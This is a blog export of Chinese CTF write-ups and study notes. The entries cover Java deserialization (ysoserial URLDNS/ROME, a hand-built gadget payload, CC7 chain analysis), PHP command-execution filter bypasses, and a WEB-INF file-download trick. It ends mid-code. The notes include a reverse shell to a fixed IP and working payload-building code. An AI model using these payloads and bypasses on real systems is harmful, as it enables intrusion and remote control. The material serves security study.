    <content><![CDATA[<h2 id="网鼎杯-2020-朱雀组-Think-Java"><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h2><span id="more"></span>

<blockquote>
<p>血的教训</p>
<p>千万不要用powershell使用ysoserial,生成的payload直接乱码呜呜</p>
</blockquote>
<p>本题起初找不到入口,看的别人的wp做的,也学习到了很多东西</p>
<p>生成URLDNS payload</p>
<p><code>java -jar ysoserial.jar URLDNS &quot;http://3s8kl8.dnslog.cn&quot; &gt; url.bin</code></p>
<p>按照其token规则进行编码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">r&quot;F:\TOOLS\ser\url.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">now = file.read()</span><br><span class="line">ba = base64.b64encode(now)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Bearer &quot;</span>+ba.decode(<span class="string">&#x27;unicode_escape&#x27;</span>))</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p>在<code>/common/user/current</code>发送</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220326161131867.png" alt="image-20220326161131867"></p>
<p>dnslog收到请求</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220326161147299.png" alt="image-20220326161147299"></p>
<p><code>bash -i &gt;&amp; /dev/tcp/121.40.113.226/5555 0&gt;&amp;1</code>反弹shell的命令要进行一次转换</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220326162201101.png" alt="image-20220326162201101"></p>
<p>接着生成反弹shell的反序列化字节码文件</p>
<p><code>java -jar ysoserial.jar ROME &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDAuMTEzLjIyNi81NTU1IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; shell.bin</code></p>
<p>反弹shell尝试了两次才成功</p>
<h2 id="ezgaeget（东华杯）"><a href="#ezgaeget（东华杯）" class="headerlink" title="ezgaeget（东华杯）"></a>ezgaeget（东华杯）</h2><p>本题是一道关于java反序列化的题目</p>
<p>题目有一个jar包,通过Java Decompiler打开,查看里面的类,发现一个类ToStringBean,它的toString方法不但能从字节码加载类,并且还能帮助类继续实例化,所以这就是代码执行的地方了,想办法将ClassByte换成恶意类的字节码即可</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220318151601653.png" alt="image-20220318151601653"></p>
<p>并且在IndexController这个Controller类中发现了能进行反序列化的地方</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220318151834640.png" alt="image-20220318151834640"></p>
<p>java中ObjectInputStream.readObject其实就是反序列化的方法</p>
<p>所以现在思路确定下来,首先构造恶意类,让其中的readObject可以调用参数的toString方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//首先通过字节码获取对应类的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\javaSecurity\\cc\\target\\test-classes\\test.class&quot;</span>));</span><br><span class="line">        ToStringBean toStringBean = <span class="keyword">new</span> ToStringBean();</span><br><span class="line">        Class&lt;? extends ToStringBean&gt; toStringBeanClass = toStringBean.getClass();</span><br><span class="line">        Field classByte = toStringBeanClass.getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        classByte.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        classByte.set(toStringBean,bytes);</span><br><span class="line">        <span class="comment">//现在代码执行的地方已经封装好了,接下来就是构造反序列化时候能调用toString,恰好BadAttributeValueExpException的readObject会调用toString</span></span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//此处有个坑,就是BadAttributeValueExpException的构造方法会先执行toString,所以通过反射在实例化后再次修改</span></span><br><span class="line">        Class&lt;? extends BadAttributeValueExpException&gt; badAttributeValueExpExceptionClass = badAttributeValueExpException.getClass();</span><br><span class="line">        Field val = badAttributeValueExpExceptionClass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,toStringBean);</span><br><span class="line">        <span class="comment">//构造完成,接下来只需要构造base64编码的字节流</span></span><br><span class="line">        </span><br><span class="line">        ByteOutputStream byteOutputStream=<span class="keyword">new</span> ByteOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> ObjectOutputStream(byteOutputStream);</span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;gadgets&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">2021</span>);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes1=byteOutputStream.toByteArray();</span><br><span class="line">        </span><br><span class="line">        System.out.println(Tools.base64Encode(bytes1));</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>起初没有保证序列化之前的包名一致,导致无法正常反序列化,反序列化的时候必须保证反序列化的类所在的包名一样</p>
<p>还有一个坑点,就是base64在传的时候,记得先urlencode一次,防止将+当成空格去传,但是解码的时候又把空格当成base64来解码,所以会报<code>Illegal base64 character 20</code>错误</p>
<p>传入data为打印出的字符串,成功执行代码</p>
<p><code>java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://121.40.113.226:5555/ RMIClient</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=121.40.113.226 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>php命令执行小总结</title>
    <url>/2022/01/08/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h3 id="PHP常见的命令执行函数和运算符"><a href="#PHP常见的命令执行函数和运算符" class="headerlink" title="PHP常见的命令执行函数和运算符"></a>PHP常见的命令执行函数和运算符<span id="more"></span></h3><h5 id="1-system-函数"><a href="#1-system-函数" class="headerlink" title="1.system()函数"></a>1.system()函数</h5><p>用于执行外部程序,并且显示输出</p>
<p>system(‘whoami’)</p>
<p>root</p>
<h5 id="2-exec函数"><a href="#2-exec函数" class="headerlink" title="2.exec函数"></a>2.exec函数</h5><p>用于执行一个外部程序, 并不会自动输出,需要加echo</p>
<p>echo exec(‘whoami’)</p>
<p>root</p>
<h5 id="3-shell-exec函数"><a href="#3-shell-exec函数" class="headerlink" title="3.shell_exec函数"></a>3.shell_exec函数</h5><p>通过shell环境执行命令,并且将完整的输出以字符串的方式返回,不会自动输出,需要加echo</p>
<p>echo shell_exec(‘whoami’)</p>
<p>root</p>
<h5 id="4-passthru函数"><a href="#4-passthru函数" class="headerlink" title="4.passthru函数"></a>4.passthru函数</h5><p>用于执行外部程序并且显示原始输出</p>
<p>passthru(‘whoami’)</p>
<p>root</p>
<h5 id="5-popen函数"><a href="#5-popen函数" class="headerlink" title="5.popen函数"></a>5.popen函数</h5><p>popen函数用于打开进程文件指针,用法如下:</p>
<p>resource.popen(string $command,string $mode)</p>
<p>例如</p>
<p>popen(“touch test.txt”,”r”);执行该代码后,会在当前目录下创建text.txt文件</p>
<h5 id="6-proc-popen"><a href="#6-proc-popen" class="headerlink" title="6.proc_popen"></a>6.proc_popen</h5><p>用于执行一个命令,并且打开用来输入输出的文件指针.大概相当于popen的数组版</p>
<h5 id="7-反单引号"><a href="#7-反单引号" class="headerlink" title="7.反单引号"></a>7.反单引号</h5><p>反单引号是PHP执行运算符,PHP将尝试将返单引号中的内容作为shell命令来执行,并将其输出信息返回</p>
<p>例如</p>
<p>echo `whoami`;</p>
<p>root</p>
<h4 id="Windows下的命令连接符"><a href="#Windows下的命令连接符" class="headerlink" title="Windows下的命令连接符"></a>Windows下的命令连接符</h4><h5 id="1-amp-命令连接符"><a href="#1-amp-命令连接符" class="headerlink" title="1)&amp;命令连接符"></a>1)&amp;命令连接符</h5><p>&amp;前面的语句为假,则直接执行&amp;后面的语句,&amp;前面的语句为真,则&amp;前后的语句都执行</p>
<h5 id="2-amp-amp-命令连接符"><a href="#2-amp-amp-命令连接符" class="headerlink" title="2)&amp;&amp;命令连接符"></a>2)&amp;&amp;命令连接符</h5><p>&amp;&amp;前面的语句为假,则直接报错,&amp;&amp;后面的语句也不执行</p>
<h5 id="3-命令连接符"><a href="#3-命令连接符" class="headerlink" title="3)|命令连接符"></a>3)|命令连接符</h5><p>|前面的语句为假,则直接报错,|后面的语句也不执行;</p>
<p>|前面的语句为真,则执行|后面的语句</p>
<h5 id="4-命令连接符"><a href="#4-命令连接符" class="headerlink" title="4)||命令连接符"></a>4)||命令连接符</h5><p>||前面的语句为假,则执行||后面的语句;</p>
<p>||前面的语句为真,则只执行||前面的语句,不执行||后面的语句</p>
<h4 id="linux下的命令连接符"><a href="#linux下的命令连接符" class="headerlink" title="linux下的命令连接符"></a>linux下的命令连接符</h4><h5 id="1-命令连接符"><a href="#1-命令连接符" class="headerlink" title="1);命令连接符"></a>1);命令连接符</h5><p>;使多个命令顺序执行,前面的命令和后面的命令都会执行</p>
<h5 id="2-amp-命令连接符"><a href="#2-amp-命令连接符" class="headerlink" title="2)&amp;命令连接符"></a>2)&amp;命令连接符</h5><p>&amp;的作用是使命令在后台运行,这样就可以同时执行多条命令</p>
<p>id&amp;whoami前后命令都会执行</p>
<h5 id="3-amp-amp-命令连接符"><a href="#3-amp-amp-命令连接符" class="headerlink" title="3)&amp;&amp;命令连接符"></a>3)&amp;&amp;命令连接符</h5><p>&amp;&amp;的作用是:如果前面的命令执行成功,则执行后面的命令</p>
<h5 id="4-命令连接符-管道符"><a href="#4-命令连接符-管道符" class="headerlink" title="4)|命令连接符(管道符)"></a>4)|命令连接符(管道符)</h5><p>|的作用是:将前面的命令的输出作为后面的命令的输入,前面的命令和后面的命令都会执行,但是只显示后面的命令的执行效果.</p>
<h5 id="5-命令连接符"><a href="#5-命令连接符" class="headerlink" title="5||命令连接符"></a>5||命令连接符</h5><p>类似于if-else语句,前面执行后面不执行,前面执行失败后面执行</p>
<h3 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h3><h4 id="1-绕过空格过滤"><a href="#1-绕过空格过滤" class="headerlink" title="1.绕过空格过滤"></a>1.绕过空格过滤</h4><h5 id="1-IFS-绕过"><a href="#1-IFS-绕过" class="headerlink" title="1)${IFS}绕过"></a>1)${IFS}绕过</h5><p>$IFS是shell的特殊环境变量,是linux下的内部域分隔符.${IFS}中存储的值可以是空格/制表符/换行符或者其他自定义符号</p>
<h5 id="2-IFS-9绕过"><a href="#2-IFS-9绕过" class="headerlink" title="2)$IFS$9绕过"></a>2)$IFS$9绕过</h5><h5 id="3-制表符绕过"><a href="#3-制表符绕过" class="headerlink" title="3)制表符绕过"></a>3)制表符绕过</h5><p>%09是制表符的url编码,可以通过%09来代替空格,绕过空格过滤</p>
<h5 id="4-绕过"><a href="#4-绕过" class="headerlink" title="4){ }绕过"></a>4){ }绕过</h5><p>空格过滤可以用{ }绕过,例如</p>
<p>{cat,index.php}</p>
<h5 id="5-lt-绕过"><a href="#5-lt-绕过" class="headerlink" title="5)&lt;绕过"></a>5)&lt;绕过</h5><p>例如cat&lt;index.php</p>
<h4 id="2-绕过关键字过滤"><a href="#2-绕过关键字过滤" class="headerlink" title="2.绕过关键字过滤"></a>2.绕过关键字过滤</h4><p><strong>利用反引号绕过``包裹的内容在php中会被当成系统命令执行</strong></p>
<h5 id="1-变量拼接绕过"><a href="#1-变量拼接绕过" class="headerlink" title="1)变量拼接绕过"></a>1)变量拼接绕过</h5><p>linux支持变量赋值,可以通过变量拼接来绕过过滤规则</p>
<p>例如</p>
<p>$a=c;$b=at;$a$b index.php</p>
<h5 id="2-空变量绕过"><a href="#2-空变量绕过" class="headerlink" title="2)空变量绕过"></a>2)空变量绕过</h5><p>例如,可以通过空变量绕过cat命令过滤</p>
<p>ca${x}t index.php</p>
<h5 id="3-系统变量绕过"><a href="#3-系统变量绕过" class="headerlink" title="3)系统变量绕过"></a>3)系统变量绕过</h5><p>${SHELLOPTS}是系统变量,可以利用系统变量的字符拼接绕过过滤</p>
<h5 id="4-绕过-1"><a href="#4-绕过-1" class="headerlink" title="4)\绕过"></a>4)\绕过</h5><p>可以通过c\a\t index.php绕过cat命令过滤</p>
<h5 id="5-通配符绕过-简单正则"><a href="#5-通配符绕过-简单正则" class="headerlink" title="5)通配符绕过(简单正则)"></a>5)通配符绕过(简单正则)</h5><p>linux支持利用通配符进行字符匹配.通配符的作用是在模糊查询时表示文件名中某些不确定的字符</p>
<p>通配符规则如下:</p>
<ul>
<li>*表示0到多个任意字符</li>
<li>?代表一个任意字符</li>
<li>[ ]内为字符范围,代表该字符范围中的任意一个字符</li>
</ul>
<p>例如对于/etc/passwd可以使用/???/???sw?来绕过</p>
<h5 id="6-shell反弹绕过"><a href="#6-shell反弹绕过" class="headerlink" title="6)shell反弹绕过"></a>6)shell反弹绕过</h5><h5 id="7-Base64编码绕过"><a href="#7-Base64编码绕过" class="headerlink" title="7)Base64编码绕过"></a>7)Base64编码绕过</h5><p>利用系统函数base64对命令进行base64编码,以绕过过滤,例如,id命令的base64编码为aWQ=,再利用base64 -d对aWQ=进行解码,就绕过了过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;aWQ=&quot;|base64 -d</span><br></pre></td></tr></table></figure>

<p>原理:利用echo和管道符向base64输入aWQ=,然后由base64 -d解码为id,再因外面包裹的``反引号,将id当命令执行</p>
<h5 id="8-利用expr和awk绕过"><a href="#8-利用expr和awk绕过" class="headerlink" title="8)利用expr和awk绕过"></a>8)利用expr和awk绕过</h5><p>通过expr和awk命令从其他的文件中获取字符并进行命令构造</p>
<p>例如</p>
<h5 id="9-无回显的命令执行如果存在命令执行漏洞-但是没有回显-可以通过shell反弹的方式将shell反弹到vps上-然后通过vps执行命令-如果无法反弹shell-也可以通过-DNS管道解析的方式获取命令的执行结果"><a href="#9-无回显的命令执行如果存在命令执行漏洞-但是没有回显-可以通过shell反弹的方式将shell反弹到vps上-然后通过vps执行命令-如果无法反弹shell-也可以通过-DNS管道解析的方式获取命令的执行结果" class="headerlink" title="9)无回显的命令执行如果存在命令执行漏洞,但是没有回显,可以通过shell反弹的方式将shell反弹到vps上,然后通过vps执行命令.如果无法反弹shell,也可以通过 DNS管道解析的方式获取命令的执行结果"></a>9)无回显的命令执行如果存在命令执行漏洞,但是没有回显,可以通过shell反弹的方式将shell反弹到vps上,然后通过vps执行命令.如果无法反弹shell,也可以通过 DNS管道解析的方式获取命令的执行结果</h5>]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>一些有意思的题目</title>
    <url>/2022/03/27/%E4%B8%80%E4%BA%9B%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<p>一些简单但是很有意思的题目<span id="more"></span></p>
<h3 id="buu-Java逆向解密"><a href="#buu-Java逆向解密" class="headerlink" title="buu Java逆向解密"></a>buu Java逆向解密</h3><p>想做java题在buu搜偶然搜到的,虽然很简单,但是也有学习到东西</p>
<p>下载附件打开是一个class文件,利用<code>jd-jui</code>逆向得到代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Scanner s = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">    System.out.println(<span class="string">&quot;Please input the flag ：&quot;</span>);</span><br><span class="line">    String str = s.next();</span><br><span class="line">    System.out.println(<span class="string">&quot;Your input is ：&quot;</span>);</span><br><span class="line">    System.out.println(str);</span><br><span class="line">    <span class="keyword">char</span>[] stringArr = str.toCharArray();</span><br><span class="line">    Encrypt(stringArr);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Encrypt</span><span class="params">(<span class="keyword">char</span>[] arr)</span> </span>&#123;</span><br><span class="line">    ArrayList Resultlist = <span class="keyword">new</span> ArrayList();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">      <span class="keyword">int</span> result = arr[i] + <span class="string">&#x27;@&#x27;</span> ^ <span class="number">0x20</span>;</span><br><span class="line">      Resultlist.add(Integer.valueOf(result));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span>[] KEY = &#123; <span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span> &#125;;</span><br><span class="line">    ArrayList KEYList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; KEY.length; j++) &#123;</span><br><span class="line">      KEYList.add(Integer.valueOf(KEY[j]));</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;Result:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (Resultlist.equals(KEYList))</span><br><span class="line">      System.out.println(<span class="string">&quot;Congratulations！&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      System.err.println(<span class="string">&quot;Error！&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>int result = arr[i] + &#39;@&#39; ^ 0x20;</code></p>
<p>这块的意思是先+64再与32异或,起初以为是+64与32的异或结果,后来找到了运算优先级,逻辑运算符号的运算级优先级普遍低于正常的加减乘除</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/youxianji.jpg" alt="youxianji"></p>
<p>还有就是java整数与ascii之间的转换</p>
<p>数组与数组直接的转换</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] KEY = &#123; <span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span> &#125;;</span><br><span class="line">        ArrayList&lt;Integer&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;KEY.length;i++)&#123;</span><br><span class="line">            arrayList.add(KEY[i]-<span class="number">64</span>^<span class="number">32</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Integer[] array=<span class="keyword">new</span> Integer[arrayList.size()];</span><br><span class="line">        arrayList.toArray(array);</span><br><span class="line">        System.out.println(array);</span><br><span class="line">        StringBuilder s=<span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;array.length;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> a=array[i];</span><br><span class="line">            s.append((<span class="keyword">char</span>)a);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p>打开页面点help到一个页面 post请求能下载任意文件</p>
<p>下载默认的<code>help.docx</code>打开什么都没有</p>
<p>去网上搜了搜,发现默认的java web项目WEB-INF目录下面有着保存着各种组件的注册信息的<code>web.xml</code></p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220327010317994.png" alt="image-20220327010317994" style="zoom:80%;" />

<p>从中看到一个叫flag的servlet</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220327010512618.png" alt="image-20220327010512618" style="zoom: 67%;" />

<p>访问看到了FlagController在包中的真实路径</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220327010953447.png" alt="image-20220327010953447"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WEB-INF主要包含一下文件或目录:</span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>

<p>包中的路径会对应到<code>/WEB-INF/classes/</code></p>
<p>在下载文件的地方请求<code>WEB-INF/classes/com/wm/ctf/FlagController.class</code></p>
<p>得到文件后用<code>jd-jui</code>打开得到flag</p>
<p>对开发中的路径更熟悉了</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>cc7</title>
    <url>/2022/03/31/cc7/</url>
    <content><![CDATA[<h3 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h3><span id="more"></span>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220401002812718.png" alt="image-20220401002812718"></p>
<p>之前的链都是看的别人的讲解,剩的这条链要自己分析一下</p>
<p>后半段依然用的是LazyMap的get方法,</p>
<p><code>AbstractMap.equals</code>方法中调用了get方法</p>
<h5 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h5><p>Hashtable可以理解为线程安全的散列表hashMap</p>
<p>先看Hashtable的序列化过程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Entry&lt;Object, Object&gt; entryStack = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="comment">// Write out the length, threshold, loadfactor</span></span><br><span class="line">            s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Write out length, count of elements</span></span><br><span class="line">            s.writeInt(table.length);<span class="comment">//写入table的容量</span></span><br><span class="line">            s.writeInt(count);<span class="comment">//写入table的元素个数</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Stack copies of the entries in the table</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">                Entry&lt;?,?&gt; entry = table[index];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (entry != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    entryStack =</span><br><span class="line">                        <span class="keyword">new</span> Entry&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                    entry = entry.next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Write out the key/value objects from the stacked entries</span></span><br><span class="line">        <span class="keyword">while</span> (entryStack != <span class="keyword">null</span>) &#123;</span><br><span class="line">            s.writeObject(entryStack.key);</span><br><span class="line">            s.writeObject(entryStack.value);</span><br><span class="line">            entryStack = entryStack.next;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//因为经历了一次入栈和出栈,所以序列化后顺序刚好是反的</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331000545609.png" alt="image-20220331000545609"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331000314892.png" alt="image-20220331000314892"></p>
<p>使用zkar分析后的确如此,序列化后是反的,但是后面反序列化的时候并没有再反一次让它正过来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the original length of the array and number of elements</span></span><br><span class="line">        <span class="keyword">int</span> origlength = s.readInt();</span><br><span class="line">        <span class="keyword">int</span> elements = s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Compute new size with a bit of room 5% to grow but</span></span><br><span class="line">        <span class="comment">// no larger than the original size.  Make the length</span></span><br><span class="line">        <span class="comment">// odd if it&#x27;s large enough, this helps distribute the entries.</span></span><br><span class="line">        <span class="comment">// Guard against the length ending up zero, that&#x27;s not valid.</span></span><br><span class="line">        <span class="keyword">int</span> length = (<span class="keyword">int</span>)(elements * loadFactor) + (elements / <span class="number">20</span>) + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">            length--;</span><br><span class="line">        <span class="keyword">if</span> (origlength &gt; <span class="number">0</span> &amp;&amp; length &gt; origlength)</span><br><span class="line">            length = origlength;</span><br><span class="line">        table = <span class="keyword">new</span> Entry&lt;?,?&gt;[length];</span><br><span class="line">        threshold = (<span class="keyword">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                K key = (K)s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                V value = (V)s.readObject();</span><br><span class="line">            <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">            reconstitutionPut(table, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>readObject方法中,先根据之前写入的两个Int值,计算出需要创建的table的大小,然后创建一个table,然后从反序列化流中依次读取元素并调用<code>reconstitutionPut</code>方法,然后将其中的key和value放入table</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> StreamCorruptedException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">        <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">        <span class="keyword">int</span> hash = key.hashCode();</span><br><span class="line">        <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span 